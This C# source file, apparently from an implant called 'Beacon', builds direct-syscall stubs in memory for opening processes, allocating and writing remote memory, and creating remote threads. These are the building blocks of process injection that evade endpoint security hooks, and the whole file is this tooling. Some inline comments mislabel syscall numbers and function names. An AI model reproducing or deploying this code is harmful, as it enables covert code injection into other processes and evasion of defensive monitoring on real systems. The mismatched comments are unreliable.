using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Beacon.Utils.Native;

namespace Beacon.Utils
{
    class Syscalls
    {

        static byte[] bNtCreateThreadEx =
{
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0xBD, 0x00, 0x00, 0x00,   // mov eax, 0xBD (bNtCreateThreadEx Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        public static NTSTATUS NtCreateThreadEx(
             ref IntPtr threadHandle,
                Win32.WinNT.ACCESS_MASK desiredAccess,
                IntPtr objectAttributes,
                IntPtr processHandle,
                IntPtr startAddress,
                IntPtr parameter,
                bool createSuspended,
                int stackZeroBits,
                int sizeOfStack,
                int maximumStackSize,
                IntPtr attributeList)
        {
            byte[] syscall = bNtCreateThreadEx;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Win32.Kernel32.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));

                    return (NTSTATUS)assembledFunction(
                        out threadHandle,
                desiredAccess,
                 objectAttributes,
                 processHandle,
                 startAddress,
                 parameter,
                 createSuspended,
                 stackZeroBits,
                 sizeOfStack,
                 maximumStackSize,
                 attributeList);
                }
            }
        }


        static byte[] bNtWriteVirtualMemory =
{
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x3A, 0x00, 0x00, 0x00,   // mov eax, 0x3a (bNtWriteVirtualMemory Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        public static NTSTATUS NtWriteVirtualMemory(
             IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            UInt32 BufferLength,
            ref UInt32 BytesWritten)
        {
            byte[] syscall = bNtWriteVirtualMemory;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Win32.Kernel32.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtWriteVirtualMemory assembledFunction = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWriteVirtualMemory));

                    return (NTSTATUS)assembledFunction(
                         ProcessHandle,
             BaseAddress,
             Buffer,
             BufferLength,
            ref BytesWritten);
                }
            }
        }


        static byte[] bNtAllocateVirtualMemory =
{
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x18, 0x00, 0x00, 0x00,   // mov eax, 0x3a (NtCreateFile Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        public static NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref IntPtr RegionSize,
                Win32.Kernel32.AllocationType AllocationType,
                UInt32 Protect)
        {
            byte[] syscall = bNtAllocateVirtualMemory;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Win32.Kernel32.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

                    return (NTSTATUS)assembledFunction(
                          ProcessHandle,
                ref BaseAddress,
                 ZeroBits,
                ref RegionSize,
                 AllocationType,
                Protect);
                }
            }
        }


        static byte[] bNtOpenProcess =
{
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, 0x26, 0x00, 0x00, 0x00,   // mov eax, 0x18 (bNtOpenProcess Syscall)
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };

        public static NTSTATUS NtOpenProcess(
             ref IntPtr ProcessHandle,
                Win32.Kernel32.ProcessAccessFlags DesiredAccess,
                ref Native.OBJECT_ATTRIBUTES ObjectAttributes,
                ref Native.CLIENT_ID ClientId)
        {
            byte[] syscall = bNtOpenProcess;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {
                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Win32.Kernel32.VirtualProtect(memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint lpflOldProtect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtOpenProcess assembledFunction = (Delegates.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtOpenProcess));

                    return (NTSTATUS)assembledFunction(
                           ref ProcessHandle,
                 DesiredAccess,
                ref ObjectAttributes,
                ref ClientId);
                }
            }
        }


        public struct Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate Native.NTSTATUS NtCreateThreadEx(
                out IntPtr threadHandle,
                Win32.WinNT.ACCESS_MASK desiredAccess,
                IntPtr objectAttributes,
                IntPtr processHandle,
                IntPtr startAddress,
                IntPtr parameter,
                bool createSuspended,
                int stackZeroBits,
                int sizeOfStack,
                int maximumStackSize,
                IntPtr attributeList);


            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            UInt32 BufferLength,
            ref UInt32 BytesWritten);


            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NTSTATUS NtAllocateVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref IntPtr RegionSize,
                Win32.Kernel32.AllocationType AllocationType,
                UInt32 Protect);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate NTSTATUS NtOpenProcess(
                ref IntPtr ProcessHandle,
                Win32.Kernel32.ProcessAccessFlags DesiredAccess,
                ref Native.OBJECT_ATTRIBUTES ObjectAttributes,
                ref Native.CLIENT_ID ClientId);

        }
    }
}
